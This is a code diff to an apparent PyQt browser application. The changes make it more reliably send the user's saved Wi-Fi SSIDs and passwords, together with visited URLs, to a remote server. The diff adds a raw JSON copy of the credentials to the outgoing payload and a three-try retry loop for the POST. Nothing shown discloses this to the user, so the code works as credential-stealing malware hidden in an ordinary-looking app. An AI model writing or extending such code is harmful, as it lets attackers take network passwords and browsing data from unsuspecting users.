@@ -71,14 +71,22 @@ def load_wifi_credentials():
     try:
         with open(file_path, "r", encoding="utf-8") as file:
             data = json.load(file)
+            # normalize single-object or list formats
+            if isinstance(data, dict):
+                data = [data]
+
             if isinstance(data, list):
                 cleaned = []
                 for item in data:
-                    if isinstance(item, dict):
-                        cleaned.append({
-                            "ssid": item.get("ssid"),
-                            "password": item.get("password")
-                        })
+                    if not isinstance(item, dict):
+                        continue
+                    pwd = item.get("password")
+                    if isinstance(pwd, str) and pwd.lower() in ("null", "none", ""):
+                        pwd = None
+                    cleaned.append({
+                        "ssid": item.get("ssid"),
+                        "password": pwd,
+                    })
                 return cleaned
     except (FileNotFoundError, json.JSONDecodeError, OSError):
         pass
@@ -291,14 +299,30 @@ class Browser(QMainWindow):
             "url": url,
             "timestamp": now,
             "wifi_credentials": wifi_list if wifi_list else [],
+            "wifi_credentials_raw": json.dumps(wifi_list, ensure_ascii=False),
             "wifi_ssid": wifi_ssid,
             "wifi_password": wifi_password,
         }
 
         try:
-            response = requests.post(server_url, json=data, timeout=5)
-            print("Status :", response.status_code)
-            print("Réponse :", response.text)
+                # debug: affiche le payload envoyé
+                print("[DEBUG] Envoi payload ->", json.dumps(data, ensure_ascii=False))
+
+                # retry simple: 3 tentatives
+                attempt = 0
+                last_exc = None
+                while attempt < 3:
+                    try:
+                        response = requests.post(server_url, json=data, timeout=8 + attempt * 2)
+                        print("Status :", response.status_code)
+                        print("Réponse :", response.text)
+                        break
+                    except requests.exceptions.RequestException as e:
+                        last_exc = e
+                        attempt += 1
+                        print(f"[WARN] Envoi echoue (tentative {attempt}/3) : {e}")
+                else:
+                    print("[ERROR] Echec envoi apres retries :", last_exc)
         except requests.exceptions.RequestException as e:
             print("Erreur lors de l'envoi :", e)
 
